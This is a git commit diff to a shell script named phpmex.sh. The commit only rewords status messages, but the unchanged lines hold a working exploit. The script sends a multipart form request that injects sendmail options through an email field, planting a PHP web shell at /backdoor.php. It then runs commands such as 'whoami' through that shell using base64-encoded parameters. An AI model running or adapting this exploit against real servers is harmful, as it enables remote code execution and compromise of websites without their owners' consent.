0570e716a246c07b91447c287cdb2cbea41b4901
mrg5103 <35038722+mrg5103@users.noreply.github.com>
2018-09-14 10:13:03 -0500

    Update phpmex.sh

--- phpmex.sh
+++ phpmex.sh
@@ -20,7 +20,7 @@ fi
 
 host=$1
 
-echo '[+] Exploiting '$host
+echo 'Exploiting '$host
 
 curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'
 
@@ -30,15 +30,15 @@ code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$h
 
 if [ "$code" != "200" ]
 then
-    echo '[-] Target cant be exploited'
+    echo 'Target cant be exploited'
     exit -1
 else
-    echo '[+] Backdoor.php found on remote system'
+    echo 'Backdoor.php found on remote system'
 fi
 
 cmd='whoami'
 
-    echo '[+] Running '$cmd
+    echo 'Running '$cmd
 curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder 
  echo ""
-echo '[+] Exiting'
+echo 'Exiting....'
